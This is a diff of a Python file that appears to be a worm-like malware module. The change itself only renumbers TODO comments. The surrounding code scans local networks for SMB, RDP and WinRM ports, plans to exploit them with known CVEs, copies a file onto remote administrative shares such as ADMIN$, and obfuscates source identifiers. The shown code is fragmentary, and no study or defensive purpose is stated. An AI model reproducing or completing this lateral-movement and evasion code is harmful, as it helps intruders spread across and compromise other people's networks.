@@ -17,8 +17,8 @@ import shutil
 def get_lan() -> set:
     """
     this function should return set of address of "nearby" ip by lan.
-    //TODO: find better way to to this
-    //TODO: WHY DA FUCK ONLY 192.168 OR 172.16?
+    //TODO 20: find better way to to this
+    //TODO 21: WHY DA FUCK ONLY 192.168 OR 172.16?
     """
     interfaces = netifaces.interfaces()
     local_ip = set()
@@ -39,8 +39,8 @@ def get_vuln_ports() -> dict:
     This function should "scan" for open ports from the vuln_ports set.
     this is kind'a fucked up and would probably too noisy.
     the function return dict of {ip: "open_port,open_port"}
-    //TODO: make it return list of port instead of string.
-    //TODO: nmap ? XMAS? just find better way
+    //TODO 22: make it return list of port instead of string.
+    //TODO 23: nmap ? XMAS? just find better way
     """
     vuln_ports = {'445', '3389', '5985'}
     clients = []
@@ -65,7 +65,7 @@ def get_vuln_ports() -> dict:
 def abuse_open_ports():
     """
     abuse the open ports with known CVE.
-    //TODO: Create this
+    //TODO 24: Create this
     """
     smb = '445'
     mstsc = '3389'
@@ -92,7 +92,7 @@ def drop_on_share(ip : str, file,port=445) -> None:
 
     so, we want to "explore" any existing or accessible share we got on the network.
     we can probably find much better way to do this
-    //TODO: find better way to do this.
+    //TODO 25: find better way to do this.
     """
     default_shares = [l + '$' for l in string.ascii_uppercase]
     default_shares.append('ADMIN$')
@@ -120,7 +120,7 @@ def drop_on_share(ip : str, file,port=445) -> None:
 
 def obfuscate_files(files_path):
     """obfuscate_all_files
-    //TODO: we dont use this function anymore, remove ASAP as we use the Persistance module to do that."""
+    //TODO 26: we dont use this function anymore, remove ASAP as we use the Persistance module to do that."""
     functions = {}
     vars2 = {}
     replace_it = {'base64': random_string(random.randrange(6, 22)),
